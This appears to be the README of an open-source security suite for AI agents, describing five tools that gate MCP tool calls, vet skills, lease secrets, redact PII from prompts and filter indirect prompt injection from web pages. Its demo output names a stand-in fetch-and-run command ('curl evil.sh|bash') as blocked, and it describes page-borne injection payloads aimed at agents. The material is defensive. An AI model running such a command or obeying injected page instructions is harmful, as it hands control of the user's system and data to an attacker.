# agent-security-stack

> The open-source agent-security suite — **[warden](https://github.com/askalf/warden) · [canon](https://github.com/askalf/canon) · [keeper](https://github.com/askalf/keeper) · [cordon](https://github.com/askalf/cordon) · [picket](https://github.com/askalf/picket)** — five tools across five surfaces, composed into one layered defense and exposed as one MCP server. Part of **[Own Your Stack](https://github.com/askalf)**.

OpenClaw became 2026's first big AI-security disaster three ways at once: one-click **RCE**, a **poisoned skills** marketplace, and ~135k **leaked credentials**. Three failure modes — three small, open-source, zero-dependency tools. Two more surfaces an agent touches — the **prompts** it sends a model and the **web pages** it reads — get the same treatment. **Five tools, five surfaces:**

| | own your… | closes | role |
|---|---|---|---|
| **[warden](https://github.com/askalf/warden)** | agent **actions** | RCE · exfil · SSRF · prompt-injection | the **runtime firewall** — what a tool may *do* |
| **[canon](https://github.com/askalf/canon)** | agent **skills** | poisoned / drifted skills & MCP servers | the **supply-chain gate** — which tools may *exist* |
| **[keeper](https://github.com/askalf/keeper)** | agent **secrets** | leaked API keys / credentials | the **vault** — a lease, never the key |
| **[cordon](https://github.com/askalf/cordon)** | agent **prompts** | PII / PHI / secrets leaking to the model | the **egress gateway** — what a model may *see* |
| **[picket](https://github.com/askalf/picket)** | agent **browser** | indirect prompt injection from web pages | the **perception firewall** — what a page may *say* |

The first three answered OpenClaw's three failures and **compose in-path** into a single guarded tool call (below); cordon and picket carry the same spine — *govern the agent, don't trust the surface* — onto two more surfaces.

They aren't five islands — they share one spine: canon reuses warden's scanner, keeper reuses warden's tamper-evident audit, and picket carries a warden-style action gate and keeper-style credential leases onto the browser. `npm install` dedupes warden to a single shared copy. All five are **pinned to vetted commits**, so the stack is itself a reproducible supply chain — the thing it's protecting.

## The tool-call path — three layers, one guarded call

```js
function guardedCall({ tool, action, lease }) {
  if (!canonVetted(tool))     return blocked('canon');   // supply chain  — is the tool pinned, unmodified, unpoisoned?
  if (warden.blocks(action))  return blocked('warden');  // runtime       — is the action safe?
  if (!keeper.redeems(lease)) return blocked('keeper');  // secrets       — is there a valid, scoped lease?
  return proceed();
}
```

A tool call proceeds **only when all three agree**. Flip any one layer to "bad" and the call stops there — `canon` before `warden` before `keeper`. (The other two surfaces — the prompt and the browser — are guarded by `cordon` and `picket`; see [Two more surfaces](#two-more-surfaces--own-your-prompts-and-your-browser).)

## Drop in at runtime — no app changes

The `guardedCall` above is the composition in one function; each layer also ships a **drop-in enforcer** so the same defense holds at the process / network boundary with no code changes:

- **`canon-mcp`** — an MCP proxy in front of a server: only pinned, unmodified, unpoisoned tools survive `tools/list`, and a call to anything it dropped is blocked. *Which tools may exist.*
- **`warden-mcp`** — an MCP proxy that firewalls every `tools/call` (RCE, exfil, SSRF, prompt-injection, and OS-persistence: cron / systemd-user / scheduled-task / WMI / registry-autorun) and strips poisoned tools before the client sees them; optional daemon, native fast hook, and a gray-zone LLM judge that can only *raise* risk. *What a call may do.*
- **`keeper broker`** — point your API client's base URL at it with no key; for each call it redeems a scoped, single-use lease and injects the real secret at egress, bound to one upstream. *A key the agent never holds.*

Chain them — `client → canon-mcp → warden-mcp → server`, egress through `keeper broker` — and a tool must be **vetted to exist, safe to run, and hold a valid lease to touch a secret**. Same three-way agreement as `guardedCall`, enforced live.

## One MCP server — call the whole stack

The proxies above enforce *mandatorily, in the path*. `oys-mcp` is the complementary **on-demand** surface: one MCP server that hands any client — Claude Desktop, Claude Code, any agent runtime — the whole suite as callable tools, so an agent can ask the stack to vet content, actions, and secrets mid-task.

| tool | layer | does |
|------|-------|------|
| `warden_check` | contain | is this `{tool, input}` safe to run? → allow / approve / block + why |
| `canon_scan` | vet | scan an MCP/skill manifest (JSON) for poisoning → clean / flagged |
| `keeper_lease` | key | lease a vault secret → an **opaque handle**; the secret never returns |
| `cordon_redact` | sanitize | strip PII/secrets from text → typed placeholders + tally |
| `picket_observe` | read | firewall an untrusted web page → safe view, injection withheld |

```json
{
  "mcpServers": {
    "own-your-stack": {
      "command": "npx",
      "args": ["-y", "github:askalf/agent-security-stack", "oys-mcp"],
      "env": {
        "KEEPER_HOME": "/path/to/keeper/vault",
        "PICKET_CDP": "http://127.0.0.1:9222",
        "PICKET_ALLOWLIST": "example.com",
        "OYS_WARDEN_POLICY": "{\"egressAllow\":[\"api.example.com\"]}"
      }
    }
  }
}
```

> Not yet on npm — installs straight from GitHub.

Each tool wraps the real library (`@askalf/warden`, `@askalf/canon`, `@askalf/keeper`, `@askalf/picket`, cordon's detector) — no reimplementation. `keeper_lease` returns only the lease handle; the secret is materialized at egress, never through the tool. (`warden-mcp` / `canon-mcp` remain the deployment-grade *mandatory* mode.)

## Run it

```bash
npm install     # pulls warden + canon + keeper + picket + cordon
npm run demo    # the layered defense: a clean call proceeds; a poisoned tool, a curl|bash, and a spent lease each get stopped
npm run demo:mcp  # drive all five tools over the MCP protocol
npm test        # the same compositions, as assertions
```

```text
1. vetted tool, safe GET, valid lease          {"ok":true}            the call proceeds
2. a POISONED tool                             {"ok":false,"by":"canon"}    <- canon stops it
3. a vetted tool that tries curl evil.sh|bash  {"ok":false,"by":"warden"}   <- warden stops it
4. a vetted tool whose lease is spent          {"ok":false,"by":"keeper"}   <- keeper stops it
```

*vet it (canon) → contain it (warden) → key it never holds (keeper).*

## Two more surfaces — own your prompts and your browser

The trio above guards the **tool-call** path. The same principle — *govern the agent, don't trust the surface* — extends to the two surfaces a tool call doesn't cover: the **prompt** an agent sends a model, and the **web page** it reads. Both ship in this package, are exposed by `oys-mcp` (`cordon_redact`, `picket_observe`), and also run standalone.

### [cordon](https://github.com/askalf/cordon) — own your prompts

A drop-in **LLM compliance gateway**. Point any OpenAI- or Anthropic-compatible client at cordon — change only the base URL, no client code — and raw **PII / PHI / PCI / secrets** are detected and stripped or tokenized *before* the request reaches the model. In **reversible** mode the real values are restored in the model's reply, so the answer stays usable while the provider only ever sees placeholders (`strip` keeps the placeholders, `off` is an audited passthrough). Detection is deterministic by design — regex + checksum validators (Luhn for cards, mod-97 for IBANs, ABA for routing) and zero ML — and the gateway is **fail-closed**: if detection errors, the request is blocked, never forwarded with PII intact. Every request appends to a hash-chained audit log that records entity **counts and types, never values**. This is the egress-redaction leg the rest of the suite points at.

> *In the stack:* `cordon_redact` sanitizes a single string on demand; the standalone gateway enforces the same redaction transparently on every model call.

### [picket](https://github.com/askalf/picket) — own your browser

An indirect-prompt-injection **firewall + action gate** that wraps a CDP / Chrome browser, so an agent can read a hostile web page without being hijacked by it — the **lethal trifecta** (untrusted content + private data + an outbound channel), delivered by the page. Three planes over one shared browser, and the agent only ever talks to picket:

- **Perception** — every page is captured, each node tagged with provenance and visibility, then scored by a deterministic detector (with an optional `claude-haiku-4-5` LLM-judge for novel phrasing the regex layer misses). Anything scored as a real instruction is **replaced with an opaque placeholder before the model sees it**; benign text survives inside a provenance fence. Hidden, zero-width, and authority-spoofing payloads are caught; instruction + sensitive-data + exfil co-located in one node is a hard block.
- **Action** — a warden-style gate: off-allowlist navigation denied, high-authority verbs (`buy`, `wire`, `approve`, `delete`) stepped up for approval, typing into a credential field refused outright.
- **Identity** — logins lease through **keeper** and are filled at the CDP layer, so the secret never enters the agent's context, its script, or any log.

> *In the stack:* `picket_observe` returns the instruction-stripped safe view of an untrusted URL or HTML; the standalone `GovernedBrowser` (and the `npx picket scan` CLI) is the full three-plane gate.

---
Part of **[Own Your Stack](https://github.com/askalf)** — own your AI infrastructure instead of renting it. Built by Thomas Sprayberry.
